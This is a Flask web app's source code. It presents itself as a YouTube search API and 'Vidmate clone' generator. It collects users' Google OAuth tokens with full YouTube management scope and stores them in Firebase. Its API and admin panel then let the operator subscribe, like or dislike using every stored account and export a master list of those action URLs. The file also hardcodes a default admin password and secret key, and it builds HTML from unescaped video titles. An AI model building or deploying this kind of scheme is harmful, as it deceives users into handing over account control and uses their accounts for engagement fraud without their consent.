import os
import re
import json
import secrets
import urllib.parse
import requests
import io
import zipfile
from flask import Flask, redirect, request, session, url_for, render_template, jsonify, Response, send_file
from googleapiclient.discovery import build
from google.oauth2.credentials import Credentials
from google.auth.transport.requests import Request

app = Flask(__name__)
app.secret_key = os.environ.get("FLASK_SECRET_KEY", "super_permanent_clean_key_9988_yt")
ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "abhay12345")
FIREBASE_URL = "https://luckymall-23b3f-default-rtdb.firebaseio.com"
REDIRECT_URI = "https://no-fun-only-money.onrender.com/oauth2callback"

with open("client_secret.json") as f:
    secret_data = json.load(f)
cfg = secret_data.get("web") or secret_data.get("installed")
CLIENT_ID = cfg["client_id"]
CLIENT_SECRET = cfg["client_secret"]

# --- FIREBASE HELPERS ---
def firebase_write(path, data):
    try:
        requests.put(f"{FIREBASE_URL}/{path.lstrip('/')}.json", json=data, timeout=10)
    except Exception as e: print("Firebase Write Error:", e)

def firebase_read(path):
    try:
        res = requests.get(f"{FIREBASE_URL}/{path.lstrip('/')}.json", timeout=10)
        return res.json() if res.status_code == 200 else None
    except Exception as e: return None

# --- YOUTUBE HELPERS ---
def extract_video_id(url_or_id):
    if not url_or_id: return None
    url_or_id = url_or_id.strip()
    if re.match(r'^[a-zA-Z0-9_-]{11}$', url_or_id): return url_or_id
    patterns = [r'(?:v=|\/embed\/|\/watch\?v=|\/shorts\/|^youtu\.be\/|watch\?.*v=)([a-zA-Z0-9_-]{11})', r'youtu\.be\/([a-zA-Z0-9_-]{11})']
    for p in patterns:
        m = re.search(p, url_or_id)
        if m: return m.group(1)
    return url_or_id

def resolve_channel_id(youtube, url_or_id):
    if not url_or_id: return None
    url_or_id = url_or_id.strip()
    if url_or_id.startswith('UC') and len(url_or_id) == 24: return url_or_id
    handle_match = re.search(r'(@[a-zA-Z0-9_.-]+)', url_or_id)
    if handle_match:
        try:
            res = youtube.channels().list(part="id", forHandle=handle_match.group(1)).execute()
            if res.get('items'): return res['items'][0]['id']
        except Exception: pass
    ch_match = re.search(r'/channel/(UC[a-zA-Z0-9_-]{22})', url_or_id)
    if ch_match: return ch_match.group(1)
    return url_or_id

def get_authenticated_service(token):
    user_creds = firebase_read(f"youtube_tokens/{token}")
    if not user_creds: return None, "Token invalid!"
    creds = Credentials(
        token=user_creds.get('token'), refresh_token=user_creds.get('refresh_token'),
        token_uri=user_creds.get('token_uri', 'https://oauth2.googleapis.com/token'),
        client_id=user_creds.get('client_id'), client_secret=user_creds.get('client_secret'),
        scopes=user_creds.get('scopes')
    )
    if creds.expired and creds.refresh_token:
        try:
            creds.refresh(Request())
            user_creds['token'] = creds.token
            firebase_write(f"youtube_tokens/{token}", user_creds)
        except Exception as e: return None, f"Refresh fail: {str(e)}"
    return build('youtube', 'v3', credentials=creds), None

# --- USER ROUTES ---
@app.route('/')
def index():
    token = request.args.get('token') or session.get('my_custom_token')
    user_info = None
    if token:
        user_data = firebase_read(f"youtube_tokens/{token}")
        if user_data: user_info = user_data.get('user_info', {})
    return render_template('index.html', token=token, user=user_info)

@app.route('/login')
def login():
    params = {'client_id': CLIENT_ID, 'redirect_uri': REDIRECT_URI, 'response_type': 'code', 'scope': 'https://www.googleapis.com/auth/youtube.force-ssl', 'access_type': 'offline', 'prompt': 'consent select_account'}
    return redirect(f"https://accounts.google.com/o/oauth2/v2/auth?{urllib.parse.urlencode(params)}")

@app.route('/oauth2callback')
def oauth2callback():
    code = request.args.get('code')
    if not code: return redirect(url_for('index'))
    payload = {'code': code, 'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'redirect_uri': REDIRECT_URI, 'grant_type': 'authorization_code'}
    resp = requests.post("https://oauth2.googleapis.com/token", data=payload, timeout=15)
    token_data = resp.json()
    if 'access_token' not in token_data: return f"<h3>Error:</h3><pre>{json.dumps(token_data)}</pre>", 400

    creds = Credentials(token=token_data.get('access_token'), refresh_token=token_data.get('refresh_token'), token_uri='https://oauth2.googleapis.com/token', client_id=CLIENT_ID, client_secret=CLIENT_SECRET, scopes=['https://www.googleapis.com/auth/youtube.force-ssl'])
    youtube = build('youtube', 'v3', credentials=creds)

    user_info = {'title': 'Connected Account', 'picture': ''}
    channel_id = None
    try:
        ch_resp = youtube.channels().list(part="snippet,id", mine=True).execute()
        if ch_resp.get('items'):
            channel_id = ch_resp['items'][0]['id']
            user_info['title'] = ch_resp['items'][0]['snippet'].get('title', 'YouTube User')
            user_info['picture'] = ch_resp['items'][0]['snippet'].get('thumbnails', {}).get('default', {}).get('url', '')
    except Exception: pass

    # Token Persistence Fix
    existing_token = None
    all_tokens = firebase_read("youtube_tokens") or {}
    for t_key, t_val in all_tokens.items():
        if t_val.get('channel_id') == channel_id and channel_id is not None:
            existing_token = t_key
            break

    custom_token = existing_token if existing_token else secrets.token_hex(8)
    save_payload = {'channel_id': channel_id, 'token': token_data.get('access_token'), 'refresh_token': token_data.get('refresh_token'), 'token_uri': 'https://oauth2.googleapis.com/token', 'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'scopes': ['https://www.googleapis.com/auth/youtube.force-ssl'], 'user_info': user_info}
    firebase_write(f"youtube_tokens/{custom_token}", save_payload)
    session['my_custom_token'] = custom_token
    return redirect(url_for('index', token=custom_token))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

# --- DOWNLOADS ---
@app.route('/download-guide')
def download_guide():
    token = request.args.get('token', 'YOUR_TOKEN')
    guide_text = f"""
=====================================================
        YOUTUBE AUTOMATION API - USER GUIDE
=====================================================
Aapka API Token: {token}

Is token ka use karke aap apni khud ki Vidmate jaisi website bana sakte hain.

-----------------------------------------------------
1. VIDEO SEARCH KARNA (API CALL)
-----------------------------------------------------
URL: https://no-fun-only-money.onrender.com/api?token={token}&action=search&q=trending

Response: Ye aapko JSON format me videos ki list dega.

-----------------------------------------------------
2. VIDEO PLAY KARNA (WEBSITE ME LAGANE KE LIYE)
-----------------------------------------------------
Aap search se mila 'videoId' le kar sidha YouTube embed iframe use kar sakte hain:

<iframe width="100%" height="315" src="https://www.youtube.com/embed/VIDEO_ID" frameborder="0" allowfullscreen></iframe>

-----------------------------------------------------
3. APNI WEBSITE ME KAISE LAGAYEIN?
-----------------------------------------------------
Aap apne HTML/Javascript code me fetch() ke zariye data laa sakte hain:

fetch('https://no-fun-only-money.onrender.com/api?token={token}&action=search&q=latest+songs')
  .then(res => res.json())
  .then(data => {
      // Yahan aap videos ko screen par dikha sakte hain
      console.log(data.results);
  });

NOTE: Ye API URL sirf aapke token ke sath kaam karega.
"""
    return Response(guide_text, mimetype="text/plain", headers={"Content-Disposition": f"attachment;filename=guide_{token}.txt"})

@app.route('/download-app')
def download_app():
    token = request.args.get('token', '')
    # Ek basic vidmate jaisi website ka HTML code
    html_content = f"""
    <!DOCTYPE html>
    <html>
    <head><title>My VidMate</title>
    <style>body{{background:#111;color:#fff;font-family:sans-serif;padding:20px;}} .grid{{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:15px;}}</style>
    </head>
    <body>
        <h1>My Vidmate Clone</h1>
        <input type="text" id="q" placeholder="Search videos...">
        <button onclick="search()">Search</button>
        <div id="results" class="grid" style="margin-top:20px;"></div>
        <script>
            const TOKEN = "{token}";
            function search() {{
                let q = document.getElementById('q').value;
                fetch(`https://no-fun-only-money.onrender.com/api?token=${{TOKEN}}&action=search&q=${{q}}`)
                .then(res => res.json())
                .then(data => {{
                    let html = '';
                    data.results.forEach(v => {{
                        html += `<div>
                            <a href="https://youtube.com/watch?v=${{v.videoId}}" target="_blank">
                                <img src="${{v.thumbnail}}" style="width:100%;border-radius:8px;">
                                <p style="font-size:14px;margin-top:5px;">${{v.title}}</p>
                            </a>
                        </div>`;
                    }});
                    document.getElementById('results').innerHTML = html;
                }});
            }}
        </script>
    </body>
    </html>
    """
    # Create zip in memory
    memory_file = io.BytesIO()
    with zipfile.ZipFile(memory_file, 'w') as zf:
        zf.writestr(f"index.html", html_content)
        zf.writestr("README.txt", "Apna token embed kar diya gaya hai. Direct index.html open karein.")
    memory_file.seek(0)
    return send_file(memory_file, download_name=f"vidmate_app_{token}.zip", as_attachment=True)

# --- ADMIN PANEL ---
@app.route('/admin.html', methods=['GET', 'POST'])
@app.route('/admin', methods=['GET', 'POST'])
def admin_panel():
    error = None
    if request.method == 'POST':
        if request.form.get('password') == ADMIN_PASSWORD:
            session['is_admin'] = True
            return redirect(url_for('admin_panel'))
        else:
            error = "Galat Password!"

    if not session.get('is_admin'):
        return render_template('admin.html', authenticated=False, error=error)

    all_data = firebase_read("youtube_tokens") or {}
    token_list = []
    for t_key, t_val in all_data.items():
        if isinstance(t_val, dict):
            u_info = t_val.get('user_info', {})
            token_list.append({'token': t_key, 'name': u_info.get('title', 'Unknown Account'), 'picture': u_info.get('picture', '')})

    return render_template('admin.html', authenticated=True, tokens=token_list)

@app.route('/admin-logout')
def admin_logout():
    session.pop('is_admin', None)
    return redirect(url_for('admin_panel'))

@app.route('/admin/download-all-setup')
def download_all_setup():
    if not session.get('is_admin'): return "Unauthorized", 403
    all_data = firebase_read("youtube_tokens") or {}
    base_url = "https://no-fun-only-money.onrender.com/api"
    
    lines = ["MASTER SETUP (ADMIN ONLY)\n", f"Total Accounts: {len(all_data)}\n", "="*50]
    idx = 1
    for token, details in all_data.items():
        if not isinstance(details, dict): continue
        acc_name = details.get('user_info', {}).get('title', 'Unknown')
        lines.append(f"[{idx}] {acc_name} | TOKEN: {token}")
        lines.append(f"  SUB:   {base_url}?token={token}&action=subscribe&channel_url=https://www.youtube.com/@MrBeast")
        lines.append(f"  UNSUB: {base_url}?token={token}&action=unsubscribe&channel_url=https://www.youtube.com/@MrBeast")
        lines.append(f"  LIKE:  {base_url}?token={token}&action=like&video_url=https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        lines.append(f"  DISLIKE:{base_url}?token={token}&action=dislike&video_url=https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        lines.append("-" * 50 + "\n")
        idx += 1
    return Response("\n".join(lines), mimetype="text/plain", headers={"Content-Disposition": "attachment;filename=MASTER_SETUP.txt"})

# --- MASTER API ---
@app.route('/api', methods=['GET'])
def api_handler():
    token = request.args.get('token')
    action = request.args.get('action')
    if not token or not action: return jsonify({'status': 'error', 'message': 'Missing params'}), 400

    youtube, err = get_authenticated_service(token)
    if err: return jsonify({'status': 'error', 'message': err}), 400

    try:
        if action == 'subscribe':
            channel_input = request.args.get('channel_url') or request.args.get('channel_id')
            target_channel_id = resolve_channel_id(youtube, channel_input)
            youtube.subscriptions().insert(part="snippet", body={'snippet': {'resourceId': {'kind': 'youtube#channel', 'channelId': target_channel_id}}}).execute()
            return jsonify({'status': 'success', 'message': 'Subscribed!'})

        elif action == 'unsubscribe':
            channel_input = request.args.get('channel_url') or request.args.get('channel_id')
            target_channel_id = resolve_channel_id(youtube, channel_input)
            sub_res = youtube.subscriptions().list(part="id", mine=True, forChannelId=target_channel_id).execute()
            if not sub_res.get('items'): return jsonify({'status': 'failed', 'message': 'Not subscribed!'}), 404
            youtube.subscriptions().delete(id=sub_res['items'][0]['id']).execute()
            return jsonify({'status': 'success', 'message': 'Unsubscribed!'})

        elif action == 'like':
            video_input = request.args.get('video_url') or request.args.get('video_id')
            youtube.videos().rate(id=extract_video_id(video_input), rating='like').execute()
            return jsonify({'status': 'success', 'message': 'Liked!'})

        elif action == 'dislike':
            video_input = request.args.get('video_url') or request.args.get('video_id')
            youtube.videos().rate(id=extract_video_id(video_input), rating='dislike').execute()
            return jsonify({'status': 'success', 'message': 'Disliked!'})

        elif action == 'search':
            query = request.args.get('q', 'trending')
            res = youtube.search().list(part="snippet", q=query, maxResults=12, type="video").execute()
            items = []
            for item in res.get('items', []):
                if item['id'].get('videoId'):
                    items.append({
                        'title': item['snippet']['title'],
                        'channelTitle': item['snippet']['channelTitle'],
                        'videoId': item['id']['videoId'],
                        'thumbnail': item['snippet']['thumbnails']['high']['url']
                    })
            return jsonify({'status': 'success', 'results': items})

        return jsonify({'status': 'error', 'message': 'Invalid action!'}), 400
    except Exception as e:
        return jsonify({'status': 'failed', 'error': str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
